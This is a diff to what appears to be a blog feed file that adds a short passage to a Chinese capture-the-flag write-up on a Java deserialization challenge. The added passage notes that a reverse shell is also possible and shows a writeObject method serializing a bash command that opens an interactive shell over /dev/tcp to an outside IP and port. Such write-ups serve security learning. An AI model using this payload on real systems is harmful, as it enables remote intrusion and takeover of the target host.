@@ -204,6 +204,10 @@
 
 <p>生成的替换下cookie,就得到了 flag</p>
 <p><img src="/2020/02/29/V&Nwp/image-20200301122930606.png" alt="image-20200301122930606"></p>
+<p>另外还可以反弹shell</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        String[] cmd=&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/174.0.219.93/8888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;</span><br><span class="line">        <span class="comment">//String[] cmd=&#123;"calc"&#125;;</span></span><br><span class="line">        out.writeObject(cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/29/V&Nwp/image-20200301133023973.png" alt="image-20200301133023973"></p>
 ]]></content>
   </entry>
   <entry>
